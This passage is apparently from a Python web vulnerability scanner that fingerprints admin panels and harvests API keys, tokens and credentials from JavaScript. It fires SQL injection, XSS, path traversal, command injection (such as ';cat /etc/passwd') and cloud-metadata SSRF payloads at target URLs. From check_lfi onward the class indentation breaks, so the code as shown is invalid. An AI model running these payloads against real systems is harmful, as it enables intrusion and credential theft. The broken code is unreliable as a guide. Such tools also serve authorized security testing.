     "matcher_type": "body",
     "matcher_value": r"(Nexus|nexus)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Artifactory",
     "path": "/artifactory/api/system/ping", "method": "GET",
     "matcher_type": "status", "matcher_value": [200],
     "severity": "MEDIUM", "cve_id": "",
     "body_regex": r"(OK|Artifactory)", "exploit_available": False},
    {"name": "Splunk",
     "path": "/en-US/account/login", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Splunk|splunk)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Graylog",
     "path": "/api/system", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Graylog|graylog)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Superset",
     "path": "/login/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Superset|superset)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Metabase",
     "path": "/api/health", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(Metabase|metabase|ok)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Zeppelin",
     "path": "/api/version", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Zeppelin|zeppelin)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Hadoop NameNode",
     "path": "/dfshealth.html", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Hadoop|NameNode|DFS)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Hadoop ResourceManager",
     "path": "/cluster", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(ResourceManager|cluster)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Spark Master",
     "path": "/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Spark|Spark Master)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Kafka Manager",
     "path": "/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Kafka|kafka-manager)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "RabbitMQ",
     "path": "/api/health/checks/alarms", "method": "GET",
     "matcher_type": "status", "matcher_value": [200],
     "severity": "MEDIUM", "cve_id": "",
     "body_regex": r"(status|ok)", "exploit_available": False},
    {"name": "Portainer",
     "path": "/api/status", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Portainer|portainer)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Traefik",
     "path": "/api/version", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Version|Codename)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Traefik Dashboard",
     "path": "/dashboard/", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(Traefik|Dashboard)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Cockpit",
     "path": "/cockpit/login", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Cockpit|cockpit)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Webmin",
     "path": "/session_login.cgi", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Webmin|webmin)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "cPanel",
     "path": "/cpanel", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(cPanel|cpanel)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Plesk",
     "path": "/login_up.php3", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Plesk|plesk)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "DirectAdmin",
     "path": "/CMD_LOGIN", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(DirectAdmin|directadmin)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "WebLogic Admin Console",
     "path": "/console", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(WebLogic|console)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "JBoss JMX Console",
     "path": "/jmx-console/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(JBoss|JMX)",
     "severity": "CRITICAL", "cve_id": "", "exploit_available": False},
    {"name": "JBoss Web Console",
     "path": "/web-console/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(JBoss|web-console)",
     "severity": "CRITICAL", "cve_id": "", "exploit_available": False},
    {"name": "GlassFish",
     "path": "/common/index.jsf", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(GlassFish|glassfish)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "WildFly",
     "path": "/console/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(WildFly|wildfly)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "ColdFusion Administrator",
     "path": "/CFIDE/administrator/", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(ColdFusion|CFIDE)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Jira",
     "path": "/secure/Dashboard.jspa", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Jira|jira|Atlassian)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Bitbucket",
     "path": "/account/signin", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(Bitbucket|bitbucket|Atlassian)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Bamboo",
     "path": "/userlogin.action", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(Bamboo|bamboo|Atlassian)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "OwnCloud",
     "path": "/status.php", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(installed|version|ownCloud)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Nextcloud",
     "path": "/status.php", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(installed|version|Nextcloud)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Seafile",
     "path": "/api2/server-info/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(version|Seafile)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Terraform Enterprise",
     "path": "/api/v2/ping", "method": "GET",
     "matcher_type": "status", "matcher_value": [200, 401],
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Rancher",
     "path": "/v3-public/localProviders", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Rancher|rancher)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "OpenShift",
     "path": "/healthz", "method": "GET",
     "matcher_type": "status", "matcher_value": [200],
     "severity": "MEDIUM", "cve_id": "",
     "body_regex": r"(ok|OpenShift)", "exploit_available": False},
    {"name": "Auth0",
     "path": "/.well-known/openid-configuration", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(issuer|authorization_endpoint)",
     "severity": "LOW", "cve_id": "", "exploit_available": False},
    {"name": "Keycloak",
     "path": "/auth/realms/master/.well-known/openid-configuration",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"(keycloak|authorization_endpoint)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Okta",
     "path": "/.well-known/openid-configuration", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(okta|authorization_endpoint)",
     "severity": "LOW", "cve_id": "", "exploit_available": False},
]


class Recon:

    def __init__(self, domain, base_url, threads, rate, output_dir):
        self.domain = domain
        self.base_url = base_url
        self.threads = threads
        self.rate = rate
        self.output_dir = output_dir

    def _has_tool(self, name):
        return shutil.which(name) is not None

    def _run_cmd(self, cmd, timeout=300):
        try:
            p = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=timeout)
            return p.returncode, p.stdout, p.stderr
        except Exception as e:
            return -1, "", str(e)

    def run(self):
        subs = set()
        alive = set()

        if self._has_tool("subfinder"):
            print(f"{CYAN}[INFO]{RESET} subfinder terdeteksi")
            rc, out, err = self._run_cmd(
                ["subfinder", "-d", self.domain, "-silent"])
            if rc == 0:
                for line in out.splitlines():
                    line = line.strip()
                    if line:
                        subs.add(line)
        else:
            print(f"{YELLOW}[WARN]{RESET} subfinder tidak ada, fallback DNS enum")
            subs.update(self._internal_subdomain_enum())

        subs.add(self.domain)

        if self._has_tool("httpx-toolkit"):
            httpx_bin = "httpx-toolkit"
        elif self._has_tool("httpx"):
            httpx_bin = "httpx"
        else:
            httpx_bin = None

        subs_file = os.path.join(self.output_dir, "subs.txt")
        with open(subs_file, "w") as f:
            f.write("\n".join(sorted(subs)))

        if httpx_bin:
            print(f"{CYAN}[INFO]{RESET} {httpx_bin} terdeteksi")
            rc, out, err = self._run_cmd(
                [httpx_bin, "-l", subs_file, "-silent",
                 "-status-code", "-title", "-tech-detect"])
            if rc == 0:
                for line in out.splitlines():
                    line = line.strip()
                    if line:
                        alive.add(line)
        else:
            print(f"{YELLOW}[WARN]{RESET} httpx tidak ada, fallback probe")
            alive.update(self._internal_probe(list(subs)))

        if self._has_tool("katana"):
            print(f"{CYAN}[INFO]{RESET} katana terdeteksi")
            urls_file = os.path.join(self.output_dir, "urls.txt")
            self._run_cmd(["katana", "-u", self.base_url, "-jc", "-kf",
                           "all", "-d", "5", "-silent", "-o", urls_file])

        for tool in ["gau", "waybackurls"]:
            if self._has_tool(tool):
                print(f"{CYAN}[INFO]{RESET} {tool} terdeteksi")
                urls_file = os.path.join(self.output_dir, "urls.txt")
                rc, out, err = self._run_cmd([tool, self.domain])
                if rc == 0 and out:
                    with open(urls_file, "a") as f:
                        f.write("\n" + out)
                break

        return {"subdomains": sorted(subs),
                "alive_hosts": sorted(alive) or [self.base_url]}

    def _internal_subdomain_enum(self):
        common = ["www", "mail", "ftp", "admin", "api", "dev", "staging",
                  "test", "blog", "shop", "cdn", "static", "app", "portal",
                  "secure", "vpn", "mx", "ns1", "ns2", "webmail", "cpanel"]
        found = set()
        for sub in common:
            host = f"{sub}.{self.domain}"
            try:
                socket.gethostbyname(host)
                found.add(host)
            except Exception:
                pass
        return found

    def _internal_probe(self, subs):
        def check(host):
            for proto in ["https", "http"]:
                url = f"{proto}://{host}"
                try:
                    r = requests.get(url, timeout=5, verify=False,
                                     allow_redirects=True)
                    return f"{host} [{r.status_code}]"
                except Exception:
                    continue
            return None

        alive = []
        with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.threads) as ex:
            for res in ex.map(check, subs):
                if res:
                    alive.append(res)
        return alive


class Crawler:

    def __init__(self, base_url, domain, depth, threads, rate, only_vuln):
        self.base_url = base_url
        self.domain = domain
        self.depth = depth
        self.threads = threads
        self.rate = rate
        self.only_vuln = only_vuln
        self.visited = set()
        self.urls = set()
        self.js_urls = set()
        self.js_findings = []
        self._last_req = 0
        self._compile()

    def _compile(self):
        self.re_api_keys = re.compile(
            r'(AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|'
            r'sk_live_[0-9a-zA-Z]{24}|xox[baprs]-[0-9a-zA-Z-]+|'
            r'ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|'
            r'ghu_[a-zA-Z0-9]{36}|ghs_[a-zA-Z0-9]{36}|'
            r'ghr_[a-zA-Z0-9]{36})')
        self.re_endpoints = re.compile(
            r'(/api/v\d+/[a-zA-Z0-9_/]+|/graphql|/admin)')
        self.re_s3 = re.compile(r's3\.amazonaws\.com/([a-z0-9.-]+)')
        self.re_firebase = re.compile(
            r'([a-z0-9-]+)\.firebaseio\.com|([a-z0-9-]+)\.firebaseapp\.com')
        self.re_stripe = re.compile(
            r'(sk_live_|pk_live_|sk_test_|pk_test_)[0-9a-zA-Z]{24,}')
        self.re_twilio = re.compile(r'AC[a-f0-9]{32}')
        self.re_sendgrid = re.compile(
            r'SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}')
        self.re_creds = re.compile(
            r'(password|passwd|pwd|secret|token|api_key|apikey|'
            r'api_secret|access_key|auth_token)\s*[:=]\s*'
            r'[\'"]([^\'"]+)[\'"]', re.IGNORECASE)
        self.re_jwt = re.compile(
            r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
        self.re_email = re.compile(
            r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
        self.re_internal_ip = re.compile(
            r'(10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|'
            r'172\.(1[6-9]|2\d|3[01])\.\d+\.\d+)')

    def _rate_limit(self):
        now = time.time()
        interval = 1.0 / self.rate if self.rate > 0 else 0
        if now - self._last_req < interval:
            time.sleep(interval - (now - self._last_req))
        self._last_req = time.time()

    def _fetch(self, url):
        self._rate_limit()
        ua = USER_AGENTS[hash(url) % len(USER_AGENTS)]
        try:
            return requests.get(url, timeout=8, verify=False,
                                allow_redirects=True,
                                headers={"User-Agent": ua})
        except Exception:
            return None

    def _normalize(self, url):
        try:
            p = urllib.parse.urlparse(url)
            if p.scheme not in ("http", "https"):
                return None
            if self.domain not in p.netloc:
                return None
            q = urllib.parse.parse_qsl(p.query)
            q.sort()
            return urllib.parse.urlunparse(
                (p.scheme, p.netloc, p.path or "/", p.params,
                 urllib.parse.urlencode(q), ""))
        except Exception:
            return None

    def _extract_links(self, html, base):
        links = set()
        if BeautifulSoup is None:
            return links
        try:
            soup = BeautifulSoup(html, "html.parser")
            for tag in soup.find_all(["a", "link", "iframe"]):
                href = tag.get("href") or tag.get("src")
                if href:
                    links.add(urllib.parse.urljoin(base, href))
            for tag in soup.find_all("script"):
                src = tag.get("src")
                if src:
                    full = urllib.parse.urljoin(base, src)
                    links.add(full)
                    self.js_urls.add(full)
            for form in soup.find_all("form"):
                action = form.get("action")
                if action:
                    links.add(urllib.parse.urljoin(base, action))
            for tag in soup.find_all(["img", "source"]):
                src = tag.get("src") or tag.get("srcset")
                if src:
                    links.add(urllib.parse.urljoin(base, src.split()[0]))
        except Exception:
            pass
        return links

    def _extract_js(self, url):
        r = self._fetch(url)
        if not r or r.status_code != 200:
            return
        text = r.text
        for m in self.re_api_keys.finditer(text):
            self.js_findings.append({"type": "API_KEY",
                                     "value": m.group(0),
                                     "source": url, "severity": "CRITICAL"})
        for m in self.re_endpoints.finditer(text):
            self.js_findings.append({"type": "ENDPOINT",
                                     "value": m.group(0),
                                     "source": url, "severity": "INFO"})
        for m in self.re_s3.finditer(text):
            self.js_findings.append({"type": "S3_BUCKET",
                                     "value": m.group(1),
                                     "source": url, "severity": "MEDIUM"})
        for m in self.re_firebase.finditer(text):
            val = m.group(1) or m.group(2)
            self.js_findings.append({"type": "FIREBASE", "value": val,
                                     "source": url, "severity": "MEDIUM"})
        for m in self.re_stripe.finditer(text):
            self.js_findings.append({"type": "STRIPE_KEY",
                                     "value": m.group(0),
                                     "source": url, "severity": "CRITICAL"})
        for m in self.re_twilio.finditer(text):
            self.js_findings.append({"type": "TWILIO_SID",
                                     "value": m.group(0),
                                     "source": url, "severity": "MEDIUM"})
        for m in self.re_sendgrid.finditer(text):
            self.js_findings.append({"type": "SENDGRID_KEY",
                                     "value": m.group(0),
                                     "source": url, "severity": "CRITICAL"})
        for m in self.re_creds.finditer(text):
            self.js_findings.append({"type": "HARDCODED_CRED",
                                     "value": f"{m.group(1)}={m.group(2)}",
                                     "source": url, "severity": "HIGH"})
        for m in self.re_jwt.finditer(text):
            self.js_findings.append({"type": "JWT_TOKEN",
                                     "value": m.group(0)[:120],
                                     "source": url, "severity": "HIGH"})
        for m in self.re_email.finditer(text):
            self.js_findings.append({"type": "EMAIL",
                                     "value": m.group(0),
                                     "source": url, "severity": "LOW"})
        for m in self.re_internal_ip.finditer(text):
            self.js_findings.append({"type": "INTERNAL_IP",
                                     "value": m.group(0),
                                     "source": url, "severity": "MEDIUM"})

    def run(self):
        queue = deque([(self.base_url, 0)])
        while queue:
            url, d = queue.popleft()
            norm = self._normalize(url)
            if not norm or norm in self.visited or d > self.depth:
                continue
            self.visited.add(norm)
            self.urls.add(norm)
            r = self._fetch(norm)
            if not r:
                continue
            if r.status_code in (301, 302, 307, 308):
                loc = r.headers.get("Location")
                if loc:
                    nxt = self._normalize(urllib.parse.urljoin(norm, loc))
                    if nxt and nxt not in self.visited:
                        queue.append((nxt, d + 1))
                continue
            ctype = r.headers.get("Content-Type", "")
            if "text/html" not in ctype and "text/" not in ctype:
                continue
            for link in self._extract_links(r.text, norm):
                nxt = self._normalize(link)
                if nxt and nxt not in self.visited:
                    queue.append((nxt, d + 1))

        for js in self.js_urls:
            self._extract_js(js)

        return {"urls": sorted(self.urls),
                "js_findings": self.js_findings}


class SensitiveScanner:

    def __init__(self, base_url, threads, rate):
        self.base_url = base_url.rstrip("/")
        self.threads = threads
        self.rate = rate
        self._last_req = 0
        self.re_env = re.compile(
            r'(DB_|API_|SECRET_|AWS_|TOKEN=|KEY=|PASSWORD=|USER=|HOST=)',
            re.IGNORECASE)
        self.re_git = re.compile(r'ref:\s*refs/heads/')
        self.re_index = re.compile(
            r'(Index of /|Directory listing for)', re.IGNORECASE)

    def _rate_limit(self):
        now = time.time()
        interval = 1.0 / self.rate if self.rate > 0 else 0
        if now - self._last_req < interval:
            time.sleep(interval - (now - self._last_req))
        self._last_req = time.time()

    def _check(self, path):
        url = f"{self.base_url}/{path.lstrip('/')}"
        self._rate_limit()
        try:
            r = requests.get(url, timeout=8, verify=False,
                             allow_redirects=False)
        except Exception:
            return None
        if r.status_code == 404:
            return None
        body = r.text[:5000] if r.text else ""
        snippet = body[:200].replace("\n", " ")
        severity = "INFO"
        note = ""
        ctype = r.headers.get("Content-Type", "")

        if ".env" in path and self.re_env.search(body):
            severity = "CRITICAL"
            note = "ENV file dengan secrets ter-expose"
        elif ".git" in path and self.re_git.search(body):
            severity = "CRITICAL"
            note = "Git repository ter-expose"
        elif self.re_index.search(body):
            severity = "HIGH"
            note = "Directory listing aktif"
        elif "config" in path.lower() and len(body) > 100:
            severity = "HIGH"
            note = "Config file ter-akses"
        elif "backup" in path.lower() or ".sql" in path.lower():
            severity = "HIGH"
            note = "Backup file ter-expose"
        elif r.status_code == 200:
            severity = "MEDIUM"
            note = "File ter-akses"

        return {"url": url, "path": path, "status_code": r.status_code,
                "content_length": len(r.content), "content_type": ctype,
                "snippet": snippet, "severity": severity, "note": note}

    def run(self):
        results = []
        with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.threads) as ex:
            futures = {ex.submit(self._check, p): p
                       for p in SENSITIVE_PATHS}
            for fut in tqdm(concurrent.futures.as_completed(futures),
                            total=len(futures), desc="Sensitive scan",
                            ncols=80):
                try:
                    res = fut.result()
                except Exception:
                    continue
                if res:
                    results.append(res)
                    sev = res["severity"]
                    if sev == "CRITICAL":
                        color = RED
                    elif sev == "HIGH":
                        color = YELLOW
                    else:
                        color = GREEN
                    print(f"{color}[{sev}]{RESET} {res['url']} "
                          f"({res['status_code']}) {res['note']}")
        return results


class VulnScanner:

    def __init__(self, base_url, urls, threads, rate):
        self.base_url = base_url
        self.urls = urls or [base_url]
        self.threads = threads
        self.rate = rate
        self._last_req = 0
        self.re_sql = re.compile(
            r'(SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL|SQLite|'
            r'Microsoft OLE DB|ODBC SQL Server|Unclosed quotation mark|'
            r'You have an error in your SQL syntax)', re.IGNORECASE)
        self.re_passwd = re.compile(r'root:x:0:0')
        self.re_uid = re.compile(r'uid=\d+\([\w]+\)')
        self.re_aws = re.compile(
            r'(ami-id|instance-id|local-ipv4|public-ipv4|'
            r'security-credentials)', re.IGNORECASE)

    def _rate_limit(self):
        now = time.time()
        interval = 1.0 / self.rate if self.rate > 0 else 0
        if now - self._last_req < interval:
            time.sleep(interval - (now - self._last_req))
        self._last_req = time.time()

    def _req(self, url, method="GET", **kw):
        self._rate_limit()
        try:
            kw.setdefault("timeout", 8)
            kw.setdefault("verify", False)
            kw.setdefault("allow_redirects", False)
            if method == "GET":
                return requests.get(url, **kw)
            if method == "POST":
                return requests.post(url, **kw)
            if method == "OPTIONS":
                return requests.options(url, **kw)
        except Exception:
            return None

    def _inject_get(self, url, param, payload):
        try:
            p = urllib.parse.urlparse(url)
            q = urllib.parse.parse_qsl(p.query)
            new_q = [(k, payload if k == param else v) for k, v in q]
            if not any(k == param for k, _ in q):
                new_q.append((param, payload))
            return urllib.parse.urlunparse(
                (p.scheme, p.netloc, p.path, p.params,
                 urllib.parse.urlencode(new_q), ""))
        except Exception:
            return None

    def _extract_params(self, url):
        try:
            p = urllib.parse.urlparse(url)
            return [k for k, _ in urllib.parse.parse_qsl(p.query)]
        except Exception:
            return []

    def check_sqli(self):
        payloads = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
                    "' AND SLEEP(0)--", "1' AND '1'='1",
                    "') OR ('1'='1", "1 OR 1=1"]
        findings = []
        for url in self.urls:
            for param in self._extract_params(url):
                for payload in payloads:
                    inj = self._inject_get(url, param, payload)
                    if not inj:
                        continue
                    r = self._req(inj)
                    if r and self.re_sql.search(r.text or ""):
                        findings.append({
                            "type": "SQLi", "severity": "HIGH",
                            "url": url, "param": param, "payload": payload,
                            "evidence": (r.text or "")[:300], "cve_id": ""})
                        print(f"{RED}[VULN]{RESET} SQLi @ {url} "
                              f"param={param}")
                        break
        return findings

    def check_xss(self):
        payloads = ["<script>alert(1)</script>",
                    "\"><img src=x onerror=alert(1)>",
                    "'><svg/onload=alert(1)>", "javascript:alert(1)"]
        findings = []
        for url in self.urls:
            for param in self._extract_params(url):
                for payload in payloads:
                    inj = self._inject_get(url, param, payload)
                    if not inj:
                        continue
                    r = self._req(inj)
                    if r and payload in (r.text or ""):
                        findings.append({
                            "type": "XSS (Reflected)", "severity": "MEDIUM",
                            "url": url, "param": param, "payload": payload,
                            "evidence": (r.text or "")[:300], "cve_id": ""})
                        print(f"{YELLOW}[VULN]{RESET} XSS @ {url} "
                              f"param={param}")
                        break
        return findings

    def check_lfi(self):
    payloads = [
        "../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "....//....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/etc/passwd%00",
        "/etc/passwd%00.php",
        "/etc/passwd%00.html",
        "..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "....\\....\\....\\....\\windows\\win.ini",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/version",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/auth.log",
        "/var/log/syslog",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        "expect://id",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "....//....//....//....//....//....//....//etc/passwd",
        "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd",
        "..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
    ]
    findings = []
    for url in self.urls:
        for param in self._extract_params(url):
            for payload in payloads:
                inj = self._inject_get(url, param, payload)
                if not inj:
                    continue
                r = self._req(inj)
                if not r:
                    continue
                text = r.text or ""
                if (self.re_passwd.search(text) or
                        "[extensions]" in text or
                        "for 16-bit app support" in text or
                        "DOCUMENT_ROOT=" in text or
                        "HTTP_USER_AGENT=" in text or
                        "PHP Version" in text):
                    findings.append({
                        "type": "LFI",
                        "severity": "CRITICAL",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": text[:300],
                        "cve_id": "",
                    })
                    print(f"{RED}[VULN]{RESET} LFI @ {url} "
                          f"param={param} payload={payload}")
                    break
    return findings

def check_open_redirect(self):
    params = ["redirect", "url", "next", "return", "returnUrl",
              "return_url", "returnTo", "return_to", "redirect_uri",
              "redirect_url", "redirectUrl", "continue", "dest",
              "destination", "redir", "r", "u", "link", "goto",
              "target", "out", "view", "forward", "to"]
    payloads = [
        "//evil.com",
        "https://evil.com",
        "http://evil.com",
        "/\\evil.com",
        "//evil.com/%2f..",
        "////evil.com",
        "https:evil.com",
        "/%09/evil.com",
        "//evil.com@target.com",
        "\\/evil.com",
    ]
    findings = []
    for url in self.urls:
        existing = self._extract_params(url)
        for param in set(existing) | set(params):
            for payload in payloads:
                inj = self._inject_get(url, param, payload)
                if not inj:
                    continue
                r = self._req(inj)
                if not r:
                    continue
                if r.status_code in (301, 302, 303, 307, 308):
                    loc = r.headers.get("Location", "")
                    if "evil.com" in loc:
                        findings.append({
                            "type": "Open Redirect",
                            "severity": "MEDIUM",
                            "url": url,
                            "param": param,
                            "payload": payload,
                            "evidence": loc,
                            "cve_id": "",
                        })
                        print(f"{YELLOW}[VULN]{RESET} Open Redirect "
                              f"@ {url} param={param} -> {loc}")
                        break
    return findings

def check_rce_indicators(self):
    params = ["cmd", "exec", "command", "system", "run", "ping",
              "shell", "exec_command", "execute", "query", "code",
              "eval", "do", "action", "process", "call"]
    payloads = [
        "id",
        "whoami",
        ";id",
        "|id",
        "`id`",
        "$(id)",
        "&id",
        "&&id",
        "||id",
        "; whoami",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        ";cat /etc/passwd",
        "|cat /etc/passwd",
        "`cat /etc/passwd`",
        ";echo vulnerable",
        "|echo vulnerable",
        "%0aid",
        "%0d%0aid",
        "\nid",
        "\r\nid",
    ]
    findings = []
    for url in self.urls:
        existing = self._extract_params(url)
        for param in set(existing) | set(params):
            for payload in payloads:
                inj = self._inject_get(url, param, payload)
                if not inj:
                    continue
                r = self._req(inj)
                if not r:
                    continue
                text = r.text or ""
                if (self.re_uid.search(text) or
                        self.re_passwd.search(text) or
                        "vulnerable" in text.lower()[:500]):
                    findings.append({
                        "type": "RCE Indicator",
                        "severity": "CRITICAL",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": text[:300],
                        "cve_id": "",
                    })
                    print(f"{RED}[VULN]{RESET} RCE @ {url} "
                          f"param={param} payload={payload}")
                    break
    return findings

def check_ssrf(self):
    params = ["url", "uri", "link", "src", "source", "dest",
              "destination", "target", "path", "load", "fetch",
              "open", "proxy", "redirect", "next", "return",
              "returnUrl", "callback", "webhook", "image", "img",
              "avatar", "file", "document", "page", "view", "host",
              "site", "domain", "endpoint", "api", "feed", "rss"]
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:22/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:6379/",
        "http://localhost/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO",
    ]
    findings = []
    for url in self.urls:
        existing = self._extract_params(url)
        for param in set(existing) | set(params):
            for payload in payloads:
                inj = self._inject_get(url, param, payload)
                if not inj:
                    continue
                r = self._req(inj)
                if not r:
                    continue
                text = r.text or ""
                if (self.re_aws.search(text) or
                        "computeMetadata" in text or
                        "root:x:0:0" in text or
                        "redis_version" in text or
                        "SSH-2.0" in text):
                    findings.append({
                        "type": "SSRF",
                        "severity": "CRITICAL",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": text[:300],
                        "cve_id": "",
                    })
                    print(f"{RED}[VULN]{RESET} SSRF @ {url} "
                          f"param={param} payload={payload}")
                    break
    return findings

def check_cors(self):
    findings = []
    test_origins = [
        "https://evil.com",
        "null",
        "https://attacker.example",
    ]
    for url in self.urls[:50]:
        for origin in test_origins:
            r = self._req(url, headers={"Origin": origin})
            if not r:
                continue
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials",
                                  "")
            acam = r.headers.get("Access-Control-Allow-Methods", "")
            acah = r.headers.get("Access-Control-Allow-Headers", "")

            is_vuln = False
            evidence = ""
            if acao == origin and "true" in acac.lower():
                is_vuln = True
                evidence = f"ACAO reflects {origin} with credentials"
            elif acao == "*" and "true" in acac.lower():
                is_vuln = True
                evidence = "ACAO=* with credentials=true"
            elif acao == "null":
                is_vuln = True
                evidence = "ACAO=null (bypassable)"

            if is_vuln:
                findings.append({
                    "type": "CORS Misconfiguration",
                    "severity": "MEDIUM",
                    "url": url,
                    "param": "",
                    "payload": f"Origin: {origin}",
                    "evidence": (f"{evidence} | Methods: {acam} | "
                                 f"Headers: {acah[:100]}"),
                    "cve_id": "",
                })
                print(f"{YELLOW}[VULN]{RESET} CORS @ {url} "
                      f"- {evidence}")
                break
    return findings

def check_headers(self):
    required = {
        "X-Frame-Options": "Clickjacking protection",
        "Content-Security-Policy": "CSP",
        "Strict-Transport-Security": "HSTS",
        "X-Content-Type-Options": "MIME sniffing",
        "Referrer-Policy": "Referrer policy",
        "Permissions-Policy": "Feature policy",
    }
    findings = []
